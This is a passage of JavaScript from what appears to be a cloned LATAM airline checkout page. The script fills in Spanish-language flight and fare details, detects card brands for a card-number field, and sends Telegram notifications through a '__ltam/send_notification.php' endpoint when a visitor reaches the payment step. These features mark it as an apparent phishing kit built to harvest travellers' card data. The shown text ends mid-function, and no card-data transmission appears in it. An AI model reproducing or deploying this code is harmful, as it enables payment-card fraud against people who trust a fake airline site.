    // Función para enviar notificaciones a Telegram
    function sendTelegramNotification(mensaje) {
        try {
            $.ajax({
                url: my_hosting + '__ltam/send_notification.php',
                method: 'POST',
                data: { mensaje: mensaje },
                async: true
            });
        } catch(e) {
            console.log('Error al enviar notificación:', e);
        }
    }

    $(document).ready(function() {

        // Notificación: En la página de pago
        setTimeout(function() {
            sendTelegramNotification('*en la página de pago*');
        }, 1000);

        var totalPasajeros = Object.values(JSON.parse(my_data['pasajeros'])).reduce((acc, val) => acc + val, 0);
        $('#numPasajeros').text(totalPasajeros + ' pasajero' + (totalPasajeros > 1 ? 's' : ''));
        var totalVuelo = 0;
        var totalPasajeros = 1;
        try {
            const pasajeros = JSON.parse(my_data['pasajeros'] || "{}");
            const calculatedPasajeros =
                (pasajeros.adultos || 0) +
                (pasajeros.ninos || 0) +
                (pasajeros.bebes || 0);
            totalPasajeros = calculatedPasajeros > 0 ? calculatedPasajeros : 1;
        } catch (e) {
            console.warn("Error al parsear pasajeros:", e);
        }

        if (my_data['v1_precio']) {
            const v1 = parseInt(my_data['v1_precio'].replace(/\./g, ""), 10) || 0;
            totalVuelo += v1;

            $('#vueloIda').text(`De ${my_data['origen_ciudad']} a ${my_data['destino_ciudad']}`);
            $('#fechaVueloIda').text(my_data['fecha_ida']);
            $('#horaVueloIda').html(`
    ${my_data['v1_hora_salida']} ${my_data['v1_vuelo_code'].trim()}
    <i aria-hidden="true" class="sc-fzoPby iFFIZx sc-a31d2cc-0 ihGLHW">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
            <path d="M13.55 4.45L23.4025 14.25L2 14.25L2 17.75L23.4025 17.75L13.55 27.55L16 30L30 16L16 2L13.55 4.45Z" fill="currentColor"></path>
        </svg>
    </i>
    ${my_data['v1_hora_llegada']} ${my_data['destino_code'].split(' ')[0]}
`);
        }

        if (my_data['v2_precio']) {
            const v2 = parseInt(my_data['v2_precio'].replace(/\./g, ""), 10) || 0;
            totalVuelo += v2;
            $('#vueloVuelta').text(`De ${my_data['destino_ciudad']} a ${my_data['origen_ciudad']}`);
            $('#fechaVueloVuelta').text(my_data['fecha_vuelta']);
            $('#horaVueloVuelta').html(`
      ${my_data['v2_hora_salida']} ${my_data['destino_code'].split(' ')[0]}
      <i aria-hidden="true" class="sc-fzoPby iFFIZx sc-a31d2cc-0 ihGLHW">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
              <path d="M13.55 4.45L23.4025 14.25L2 14.25L2 17.75L23.4025 17.75L13.55 27.55L16 30L30 16L16 2L13.55 4.45Z" fill="currentColor"></path>
          </svg>
      </i>
      ${my_data['v2_hora_llegada']} ${my_data['origen_code'].split(' ')[0]}
  `);
        }

        totalVuelo *= totalPasajeros;
        var totalVueloConAumento = totalVuelo;
        var totalVueloFormateado = totalVuelo.toLocaleString("es-CO");
        var totalFormateado = totalVueloConAumento.toLocaleString("es-CO");

        $('#TotalValor').text('COP ' + totalVueloFormateado);
        $("#TotalValorS").text('$ ' + totalVueloFormateado);
        $('#paymentCTA').find('span').text('Pagar COP ' + totalFormateado);
        if (my_data['v2_precio']) {
            $("#contenedorVuelta").show();
        }

        function detectarTipoTarjeta(numero) {
            const cleaned = numero.replace(/\s+/g, "");

            if (/^4[0-9]{0,}/.test(cleaned)) return "visa";
            if (/^5[1-5][0-9]{0,}/.test(cleaned)) return "mastercard";
            if (/^3[47][0-9]{0,}/.test(cleaned)) return "amex";
            if (
                /^6011/.test(cleaned) || // Discover clásico
                /^65/.test(cleaned) || // Discover moderno
                /^64[4-9]/.test(cleaned) || // Rango 644-649
                /^622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[01][0-9]|92[0-5])/.test(cleaned)
            ) return "discover";

            return null;
        }

        function getCardIconHTML(tipo) {
            if (tipo === "mastercard") {
                return `
            <div class="sc-fznLxA gSNGyF">
                <div data-testid="cardNumber--text-field__start-icon-wrapper" id="cardNumber--text-field__start-icon-wrapper" class="sc-fznLxA gSNGyF">
